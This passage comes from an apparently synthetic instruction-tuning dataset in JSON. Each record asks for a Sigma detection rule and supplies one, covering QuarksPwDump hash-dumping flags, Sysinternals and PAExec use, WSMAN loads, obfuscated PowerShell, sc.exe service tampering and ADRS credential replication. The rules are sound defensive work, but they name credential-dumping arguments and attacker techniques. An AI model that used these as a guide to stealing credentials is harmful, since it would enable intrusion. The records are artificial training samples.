    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\bginfo.exe'\n        CommandLine|contains|all:\n            - '/popup'\n            - '/nolicprompt'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\bginfo.exe'\n        CommandLine|contains|all:\n            - '/popup'\n            - '/nolicprompt'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Execute VBscript code that is referenced within the *.bgi file.",
      "answer": "In order to execute VBscript code that is referenced within the *.bgi file, you should monitor the creation of processes on Windows systems, especially focusing on the execution of 'bginfo.exe'. Specifically, look for instances where 'bginfo.exe' is executed with command line parameters that include both '/popup' and '/nolicprompt'. These command line parameters are crucial indicators of the script\u2019s execution attempt without displaying license prompts, potentially for stealthy operations. It's important to note that detecting such activities can be challenging and might result in unknown false positives. The severity of this activity is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the Quarks PwDump tool via commandline arguments.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the Quarks PwDump tool via commandline arguments, you should: Monitor process creation logs within Windows environments for instances where the QuarksPwDump.exe executable is invoked. Specifically, look for the execution of this tool with command-line arguments indicative of its usage for extracting sensitive information. These arguments include '-dhl', '--dump-hash-local', '-dhdc', '--dump-hash-domain-cached', '--dump-bitlocker', '-dhd', '--dump-hash-domain', and '--ntds-file'. Identifying any of these command-line arguments in conjunction with the QuarksPwDump.exe process should raise a high level of suspicion, as they signify attempts to dump local and domain cached hashes, as well as BitLocker recovery information. Such activities are uncommon and unlikely to generate false positives, indicating a serious security concern regarding illicit access to sensitive password information and encryption keys.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\QuarksPwDump.exe'\n    selection_cli:\n        CommandLine:\n            - ' -dhl'\n            - ' --dump-hash-local'\n            - ' -dhdc'\n            - ' --dump-hash-domain-cached'\n            - ' --dump-bitlocker'\n            - ' -dhd '\n            - ' --dump-hash-domain '\n            - '--ntds-file'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\QuarksPwDump.exe'\n    selection_cli:\n        CommandLine:\n            - ' -dhl'\n            - ' --dump-hash-local'\n            - ' -dhdc'\n            - ' --dump-hash-domain-cached'\n            - ' --dump-bitlocker'\n            - ' -dhd '\n            - ' --dump-hash-domain '\n            - '--ntds-file'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "usage of the Quarks PwDump tool via commandline arguments",
      "answer": "In order to detect usage of the Quarks PwDump tool via commandline arguments, you should: Monitor process creation logs within Windows environments for instances where the QuarksPwDump.exe executable is invoked. Specifically, look for the execution of this tool with command-line arguments indicative of its usage for extracting sensitive information. These arguments include '-dhl', '--dump-hash-local', '-dhdc', '--dump-hash-domain-cached', '--dump-bitlocker', '-dhd', '--dump-hash-domain', and '--ntds-file'. Identifying any of these command-line arguments in conjunction with the QuarksPwDump.exe process should raise a high level of suspicion, as they signify attempts to dump local and domain cached hashes, as well as BitLocker recovery information. Such activities are uncommon and unlikely to generate false positives, indicating a serious security concern regarding illicit access to sensitive password information and encryption keys."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of some potentially unwanted tools such as PsExec, Procdump, etc. (part of the Sysinternals suite) via the creation of the \"accepteula\" registry key..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of some potentially unwanted tools such as PsExec, Procdump, etc. (part of the Sysinternals suite) via the creation of the \"accepteula\" registry key, you should monitor Windows registry addition events specifically looking for the creation of a key. Focus on registry add events where the EventType is \"CreateKey\" and the TargetObject contains specific substrings related to Sysinternals tools, including 'Active Directory Explorer', 'Handle', 'LiveKd', 'Process Explorer', 'ProcDump', 'PsExec', 'PsLoglist', 'PsPasswd', 'SDelete', and 'Sysinternals'. Additionally, it's important to check if the TargetObject ends with '\\EulaAccepted', indicating the acceptance of a User Agreement typically associated with first-time running these tools. However, be aware that there may be legitimate uses of these tools within your environment, and filtering may be required to distinguish between benign and malicious activity. This monitoring strategy aims to identify potential security incidents involving the misuse of system administration tools, which could be indicative of Discovery, Lateral Movement, or Persistence techniques, without explicitly mentioning these methodologies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_add\ndetection:\n    selection:\n        EventType: CreateKey\n        TargetObject|contains:\n            - '\\Active Directory Explorer'\n            - '\\Handle'\n            - '\\LiveKd'\n            - '\\Process Explorer'\n            - '\\ProcDump'\n            - '\\PsExec'\n            - '\\PsLoglist'\n            - '\\PsPasswd'\n            - '\\SDelete'\n            - '\\Sysinternals' # Global level https://twitter.com/leonzandman/status/1561736801953382400\n        TargetObject|endswith: '\\EulaAccepted'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools. Filter the legitimate paths used in your environnement\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_add\ndetection:\n    selection:\n        EventType: CreateKey\n        TargetObject|contains:\n            - '\\Active Directory Explorer'\n            - '\\Handle'\n            - '\\LiveKd'\n            - '\\Process Explorer'\n            - '\\ProcDump'\n            - '\\PsExec'\n            - '\\PsLoglist'\n            - '\\PsPasswd'\n            - '\\SDelete'\n            - '\\Sysinternals' # Global level https://twitter.com/leonzandman/status/1561736801953382400\n        TargetObject|endswith: '\\EulaAccepted'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools. Filter the legitimate paths used in your environnement\nlevel: medium\n",
      "question": "execution of some potentially unwanted tools such as PsExec, Procdump, etc. (part of the Sysinternals suite) via the creation of the \"accepteula\" registry key.",
      "answer": "In order to detect the execution of some potentially unwanted tools such as PsExec, Procdump, etc. (part of the Sysinternals suite) via the creation of the \"accepteula\" registry key, you should monitor Windows registry addition events specifically looking for the creation of a key. Focus on registry add events where the EventType is \"CreateKey\" and the TargetObject contains specific substrings related to Sysinternals tools, including 'Active Directory Explorer', 'Handle', 'LiveKd', 'Process Explorer', 'ProcDump', 'PsExec', 'PsLoglist', 'PsPasswd', 'SDelete', and 'Sysinternals'. Additionally, it's important to check if the TargetObject ends with '\\EulaAccepted', indicating the acceptance of a User Agreement typically associated with first-time running these tools. However, be aware that there may be legitimate uses of these tools within your environment, and filtering may be required to distinguish between benign and malicious activity. This monitoring strategy aims to identify potential security incidents involving the misuse of system administration tools, which could be indicative of Discovery, Lateral Movement, or Persistence techniques, without explicitly mentioning these methodologies."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting signs of potential use of the WSMAN provider from uncommon processes locally and remote execution..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect signs of potential use of the WSMAN provider from uncommon processes locally and remote execution, you should monitor for specific image load activities in Windows environments. Look for events where certain DLL files associated with WSMAN (Windows Remote Management) are loaded, such as 'WsmSvc.dll', 'WsmAuto.dll', and 'Microsoft.WSMan.Management.ni.dll' among others. Additionally, watch for the loading of 'svchost.exe' in association with the 'WsmWmiPl.dll' file, signifying response from the server side.\n\nIt's important to exclude from your detection certain benign processes that might also load these or similar libraries but are known to be safe. Such processes include 'powershell.exe', various system utilities like 'sdiagnhost.exe' and 'services.exe', command lines invoking 'svchost.exe' for standard services, the .NET optimization service 'mscorsvw.exe', and others related to specific use cases or system activities like server management tools, temporary files, Citrix applications, or instances of PowerShell ISE.\n\nBe cautious though, as some legitimate command lines may contain 'svchost.exe' without further parameters, which should not alone trigger alerts without the specific DLLs being loaded as mentioned above.\n\nBy filtering out these general and specific images and command lines, you can effectively reduce false positives, focusing only on unusual and potentially malicious WSMAN usage patterns. The detection level for this monitoring is set to medium, acknowledging that while not all findings may represent malicious activity, they warrant investigation to rule out unauthorized or harmful remote management actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    request_client:\n        - ImageLoaded|endswith:\n            - '\\WsmSvc.dll'\n            - '\\WsmAuto.dll'\n            - '\\Microsoft.WSMan.Management.ni.dll'\n        - OriginalFileName:\n            - 'WsmSvc.dll'\n            - 'WSMANAUTOMATION.DLL'\n            - 'Microsoft.WSMan.Management.dll'\n    respond_server:\n        Image|endswith: '\\svchost.exe'\n        OriginalFileName: 'WsmWmiPl.dll'\n    filter_general:\n        Image|endswith:\n            - '\\powershell.exe'\n            - 'C:\\Windows\\System32\\sdiagnhost.exe'\n            - 'C:\\Windows\\System32\\services.exe'\n    filter_svchost: # not available in Sysmon data, but Aurora logs\n        CommandLine|contains:\n            - 'svchost.exe -k netsvcs -p -s BITS'\n            - 'svchost.exe -k GraphicsPerfSvcGroup -s GraphicsPerfSvc'\n            - 'svchost.exe -k NetworkService -p -s Wecsvc'\n            - 'svchost.exe -k netsvcs'\n    filter_mscorsvw: #Image: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe\n        Image|startswith:\n            - 'C:\\Windows\\Microsoft.NET\\Framework64\\v'\n            - 'C:\\Windows\\Microsoft.NET\\Framework\\v'\n        Image|endswith: '\\mscorsvw.exe'\n    filter_svr_2019:\n        Image:\n            - 'C:\\Windows\\System32\\Configure-SMRemoting.exe'\n            - 'C:\\Windows\\System32\\ServerManager.exe'\n    filter_nextron:\n        Image|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n    filter_citrix:\n        Image|startswith: 'C:\\Program Files\\Citrix\\'\n    filter_ps_ise:\n        Image|endswith: '\\powershell_ise.exe'\n    filter_upgrade:\n        Image|startswith: 'C:\\$WINDOWS.~BT\\Sources\\'\n    svchost:\n        Image|endswith: '\\svchost.exe'\n    commandline_null:\n        CommandLine: null\n    condition: ( request_client or respond_server ) and not 1 of filter* and not ( svchost and commandline_null )\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    request_client:\n        - ImageLoaded|endswith:\n            - '\\WsmSvc.dll'\n            - '\\WsmAuto.dll'\n            - '\\Microsoft.WSMan.Management.ni.dll'\n        - OriginalFileName:\n            - 'WsmSvc.dll'\n            - 'WSMANAUTOMATION.DLL'\n            - 'Microsoft.WSMan.Management.dll'\n    respond_server:\n        Image|endswith: '\\svchost.exe'\n        OriginalFileName: 'WsmWmiPl.dll'\n    filter_general:\n        Image|endswith:\n            - '\\powershell.exe'\n            - 'C:\\Windows\\System32\\sdiagnhost.exe'\n            - 'C:\\Windows\\System32\\services.exe'\n    filter_svchost: # not available in Sysmon data, but Aurora logs\n        CommandLine|contains:\n            - 'svchost.exe -k netsvcs -p -s BITS'\n            - 'svchost.exe -k GraphicsPerfSvcGroup -s GraphicsPerfSvc'\n            - 'svchost.exe -k NetworkService -p -s Wecsvc'\n            - 'svchost.exe -k netsvcs'\n    filter_mscorsvw: #Image: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe\n        Image|startswith:\n            - 'C:\\Windows\\Microsoft.NET\\Framework64\\v'\n            - 'C:\\Windows\\Microsoft.NET\\Framework\\v'\n        Image|endswith: '\\mscorsvw.exe'\n    filter_svr_2019:\n        Image:\n            - 'C:\\Windows\\System32\\Configure-SMRemoting.exe'\n            - 'C:\\Windows\\System32\\ServerManager.exe'\n    filter_nextron:\n        Image|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n    filter_citrix:\n        Image|startswith: 'C:\\Program Files\\Citrix\\'\n    filter_ps_ise:\n        Image|endswith: '\\powershell_ise.exe'\n    filter_upgrade:\n        Image|startswith: 'C:\\$WINDOWS.~BT\\Sources\\'\n    svchost:\n        Image|endswith: '\\svchost.exe'\n    commandline_null:\n        CommandLine: null\n    condition: ( request_client or respond_server ) and not 1 of filter* and not ( svchost and commandline_null )\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "signs of potential use of the WSMAN provider from uncommon processes locally and remote execution.",
      "answer": "In order to detect signs of potential use of the WSMAN provider from uncommon processes locally and remote execution, you should monitor for specific image load activities in Windows environments. Look for events where certain DLL files associated with WSMAN (Windows Remote Management) are loaded, such as 'WsmSvc.dll', 'WsmAuto.dll', and 'Microsoft.WSMan.Management.ni.dll' among others. Additionally, watch for the loading of 'svchost.exe' in association with the 'WsmWmiPl.dll' file, signifying response from the server side.\n\nIt's important to exclude from your detection certain benign processes that might also load these or similar libraries but are known to be safe. Such processes include 'powershell.exe', various system utilities like 'sdiagnhost.exe' and 'services.exe', command lines invoking 'svchost.exe' for standard services, the .NET optimization service 'mscorsvw.exe', and others related to specific use cases or system activities like server management tools, temporary files, Citrix applications, or instances of PowerShell ISE.\n\nBe cautious though, as some legitimate command lines may contain 'svchost.exe' without further parameters, which should not alone trigger alerts without the specific DLLs being loaded as mentioned above.\n\nBy filtering out these general and specific images and command lines, you can effectively reduce false positives, focusing only on unusual and potentially malicious WSMAN usage patterns. The detection level for this monitoring is set to medium, acknowledging that while not all findings may represent malicious activity, they warrant investigation to rule out unauthorized or harmful remote management actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PAExec service installation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PAExec service installation, you should: focus on analyzing Windows system service logs for specific event indicators that suggest a PAExec service instalation attempt. Look for logs from the Service Control Manager provider, particularly those with Event ID 7045. This event ID indicates a service has been installed in the system, which is a crucial point of observation. Pay extra attention to services whose names start with 'PAExec-' or have an image path beginning with 'C:\\WINDOWS\\PAExec-'. These characteristics are strong indicators of the PAExec utility being deployed, which is often used for remote command execution. Handling these logs accurately and monitoring for such patterns is integral in identifying potential security breaches or unauthorized activity tied to the installation of PAExec services on Windows systems. Be mindful that there may be instances where these indicators do not necessarily suggest malicious activity, hence, the possibility of unknown false positives existing, and each detection should be analyzed in its operational context. The detection approach is categorized with a medium level of importance, indicating its significance in maintaining system integrity against possible misuse of administrative tools like PAExec for unauthorized activities.\n",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection_eid:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection_image:\n        - ServiceName|startswith: 'PAExec-'\n        - ImagePath|startswith: 'C:\\WINDOWS\\PAExec-'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection_eid:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection_image:\n        - ServiceName|startswith: 'PAExec-'\n        - ImagePath|startswith: 'C:\\WINDOWS\\PAExec-'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "PAExec service installation",
      "answer": "In order to detect PAExec service installation, you should: focus on analyzing Windows system service logs for specific event indicators that suggest a PAExec service instalation attempt. Look for logs from the Service Control Manager provider, particularly those with Event ID 7045. This event ID indicates a service has been installed in the system, which is a crucial point of observation. Pay extra attention to services whose names start with 'PAExec-' or have an image path beginning with 'C:\\WINDOWS\\PAExec-'. These characteristics are strong indicators of the PAExec utility being deployed, which is often used for remote command execution. Handling these logs accurately and monitoring for such patterns is integral in identifying potential security breaches or unauthorized activity tied to the installation of PAExec services on Windows systems. Be mindful that there may be instances where these indicators do not necessarily suggest malicious activity, hence, the possibility of unknown false positives existing, and each detection should be analyzed in its operational context. The detection approach is categorized with a medium level of importance, indicating its significance in maintaining system integrity against possible misuse of administrative tools like PAExec for unauthorized activities.\n"
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries attempting to find local system groups and permission settings to identify groups and users with elevated permissions, an analysis is conducted focused on PowerShell module activity within Windows systems. These activities often indicate an adversary's efforts to enumerate local system groups and their members, which can provide insights into users with elevated permissions, including those in the local administrators group. Detection of such activities involves monitoring for specific PowerShell commands.\n\nFirstly, PowerShell commands like 'get-localgroup' and 'Get-LocalGroupMember' are essential to watch for. These commands are indicative of attempts to list local groups and their members. Monitoring logs for the presence of these commands, either in the payload or context information of PowerShell module logs, holds importance.\n\nSecondly, the combination of 'Get-WMIObject' and 'Win32_Group' used together in PowerShell commands is another critical signal. This combination signifies efforts to query local group information via Windows Management Instrumentation (WMI), a more sophisticated method of accessing systems information which can include local group memberships and permissions.\n\nThese detection mechanisms are built on the premise that while legitimate administrative activities may employ these commands for routine system management and script execution, their use could also signify malicious intent. As a preventative measure, logs should be scrutinized for the execution of these specific PowerShell commands to guard against attempts to discover local system groups and elevate permissions through group membership awareness.\n\nGiven the nature of these detection strategies, occurrences might not always represent malicious actions. Sometimes, legitimate administrative tasks involve similar commands. Therefore, alerts generated at this level should be considered with a low severity rating until further analysis can verify the intent behind these commands. This consideration is crucial in distinguishing between normal administrative activities and potential security threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    test_3:\n        - Payload|contains:\n            - 'get-localgroup'\n            - 'Get-LocalGroupMember'\n        - ContextInfo|contains:\n            - 'get-localgroup'\n            - 'Get-LocalGroupMember'\n    test_6:\n        - Payload|contains|all:\n            - 'Get-WMIObject'\n            - 'Win32_Group'\n        - ContextInfo|contains|all:\n            - 'Get-WMIObject'\n            - 'Win32_Group'\n    condition: 1 of test_*\nfalsepositives:\n    - Administrator script\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    test_3:\n        - Payload|contains:\n            - 'get-localgroup'\n            - 'Get-LocalGroupMember'\n        - ContextInfo|contains:\n            - 'get-localgroup'\n            - 'Get-LocalGroupMember'\n    test_6:\n        - Payload|contains|all:\n            - 'Get-WMIObject'\n            - 'Win32_Group'\n        - ContextInfo|contains|all:\n            - 'Get-WMIObject'\n            - 'Win32_Group'\n    condition: 1 of test_*\nfalsepositives:\n    - Administrator script\nlevel: low\n",
      "question": "Adversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n",
      "answer": "In order to detect adversaries attempting to find local system groups and permission settings to identify groups and users with elevated permissions, an analysis is conducted focused on PowerShell module activity within Windows systems. These activities often indicate an adversary's efforts to enumerate local system groups and their members, which can provide insights into users with elevated permissions, including those in the local administrators group. Detection of such activities involves monitoring for specific PowerShell commands.\n\nFirstly, PowerShell commands like 'get-localgroup' and 'Get-LocalGroupMember' are essential to watch for. These commands are indicative of attempts to list local groups and their members. Monitoring logs for the presence of these commands, either in the payload or context information of PowerShell module logs, holds importance.\n\nSecondly, the combination of 'Get-WMIObject' and 'Win32_Group' used together in PowerShell commands is another critical signal. This combination signifies efforts to query local group information via Windows Management Instrumentation (WMI), a more sophisticated method of accessing systems information which can include local group memberships and permissions.\n\nThese detection mechanisms are built on the premise that while legitimate administrative activities may employ these commands for routine system management and script execution, their use could also signify malicious intent. As a preventative measure, logs should be scrutinized for the execution of these specific PowerShell commands to guard against attempts to discover local system groups and elevate permissions through group membership awareness.\n\nGiven the nature of these detection strategies, occurrences might not always represent malicious actions. Sometimes, legitimate administrative tasks involve similar commands. Therefore, alerts generated at this level should be considered with a low severity rating until further analysis can verify the intent behind these commands. This consideration is crucial in distinguishing between normal administrative activities and potential security threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of stdin to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of stdin to execute PowerShell, you should monitor for specific driver load events within Windows environments. Look for incidences where command prompt (cmd) is used to launch PowerShell in a manner that is obfuscated. Specifically, you want to identify if the ImagePath of the loaded driver contains patterns where `cmd` is used with either `/c` or `/r` options followed closely (up to five characters apart) by `powershell`, and then includes either `${input}`, `{$input}`, or `noexit` arguments within the command, all encapsulated within double quotes. These characteristics are indicative of attempts to obfuscate command lines to execute PowerShell scripts, potentially for malicious purposes. It is important to note that due to the sophisticated nature of the obfuscation techniques used, there may be unknown false positives, and the severity level of this detection has been classified as high.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: driver_load\ndetection:\n    selection:\n        ImagePath|re: '.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\"'\n    condition: selection \nfalsepositives:\n    - Unknown\nlevel: high",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: driver_load\ndetection:\n    selection:\n        ImagePath|re: '.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\"'\n    condition: selection \nfalsepositives:\n    - Unknown\nlevel: high",
      "question": "Obfuscated use of stdin to execute PowerShell",
      "answer": "In order to detect obfuscated use of stdin to execute PowerShell, you should monitor for specific driver load events within Windows environments. Look for incidences where command prompt (cmd) is used to launch PowerShell in a manner that is obfuscated. Specifically, you want to identify if the ImagePath of the loaded driver contains patterns where `cmd` is used with either `/c` or `/r` options followed closely (up to five characters apart) by `powershell`, and then includes either `${input}`, `{$input}`, or `noexit` arguments within the command, all encapsulated within double quotes. These characteristics are indicative of attempts to obfuscate command lines to execute PowerShell scripts, potentially for malicious purposes. It is important to note that due to the sophisticated nature of the obfuscation techniques used, there may be unknown false positives, and the severity level of this detection has been classified as high."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the sc.exe utility spawning by a user with Medium integrity level to change service ImagePath or FailureCommand, you should focus on monitoring process creation events on Windows systems. Specifically, look for instances where the sc.exe command is being executed by a non-administrative user (one operating at a 'Medium' integrity level). The key activities to monitor include attempts to modify a service's configuration\u2014this can be detected by the presence of both 'config' and 'binPath' in the sc.exe command line arguments, indicating a change to the service's image path. Alternatively, detecting the inclusion of both 'failure' and 'command' in the command line arguments points to a modification of the service's failure command settings. It's important to apply this rule with caution as there could be legitimate but unknown cases of these activities, though such scenarios are considered to have a high significance level due to their potential impact on security.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel: 'Medium'\n    selection_binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    selection_failure:\n        CommandLine|contains|all:\n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel: 'Medium'\n    selection_binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    selection_failure:\n        CommandLine|contains|all:\n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand",
      "answer": "In order to detect the sc.exe utility spawning by a user with Medium integrity level to change service ImagePath or FailureCommand, you should focus on monitoring process creation events on Windows systems. Specifically, look for instances where the sc.exe command is being executed by a non-administrative user (one operating at a 'Medium' integrity level). The key activities to monitor include attempts to modify a service's configuration\u2014this can be detected by the presence of both 'config' and 'binPath' in the sc.exe command line arguments, indicating a change to the service's image path. Alternatively, detecting the inclusion of both 'failure' and 'command' in the command line arguments points to a modification of the service's failure command settings. It's important to apply this rule with caution as there could be legitimate but unknown cases of these activities, though such scenarios are considered to have a high significance level due to their potential impact on security."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials, you should monitor Windows security event logs for event ID 4662 with an AccessMask of '0x100'. This event ID indicates an attempt to perform operations that may involve Active Directory object access. Specifically, focus on attempts that involve access to certain properties identified by their unique GUIDs ('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', and '89e95b76-444d-4c62-991a-0facbeda640c'), which are critical in the context of ADRS abuse. \n\nEnsure that these observations are not coming from accounts that end with a '$' sign or start with 'MSOL_', as these are typically associated with machine or specific service accounts which are commonly excluded to reduce false positives. Instead, focus on activities initiated by user accounts that do not fall under these filters. \n\nFor accurate detection, capture fields such as ComputerName, SubjectDomainName, and SubjectUserName to help in the investigation process and attribute the actions to specific accounts and machines. It's important to be aware of the potential for unknown false positives, which signifies the criticality of contextual investigation and validation of each detection to ensure they truly represent malicious activity and not legitimate administrative operations. This detection mechanism is pivotal in identifying unauthorized attempts to exploit the Active Directory Replication Service for credential access, which aligns with defense tactics against credential access attempts leveraging directory services.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        AccessMask: '0x100'\n        Properties|contains:\n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n            - '89e95b76-444d-4c62-991a-0facbeda640c'\n    filter:\n        - SubjectUserName|endswith: '$'\n        - SubjectUserName|startswith: 'MSOL_' #https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions#ad-ds-connector-account\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        AccessMask: '0x100'\n        Properties|contains:\n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n            - '89e95b76-444d-4c62-991a-0facbeda640c'\n    filter:\n        - SubjectUserName|endswith: '$'\n        - SubjectUserName|startswith: 'MSOL_' #https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions#ad-ds-connector-account\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials.",
      "answer": "In order to detect potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials, you should monitor Windows security event logs for event ID 4662 with an AccessMask of '0x100'. This event ID indicates an attempt to perform operations that may involve Active Directory object access. Specifically, focus on attempts that involve access to certain properties identified by their unique GUIDs ('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', and '89e95b76-444d-4c62-991a-0facbeda640c'), which are critical in the context of ADRS abuse. \n\nEnsure that these observations are not coming from accounts that end with a '$' sign or start with 'MSOL_', as these are typically associated with machine or specific service accounts which are commonly excluded to reduce false positives. Instead, focus on activities initiated by user accounts that do not fall under these filters. \n\nFor accurate detection, capture fields such as ComputerName, SubjectDomainName, and SubjectUserName to help in the investigation process and attribute the actions to specific accounts and machines. It's important to be aware of the potential for unknown false positives, which signifies the criticality of contextual investigation and validation of each detection to ensure they truly represent malicious activity and not legitimate administrative operations. This detection mechanism is pivotal in identifying unauthorized attempts to exploit the Active Directory Replication Service for credential access, which aligns with defense tactics against credential access attempts leveraging directory services."
    }
  },
  {
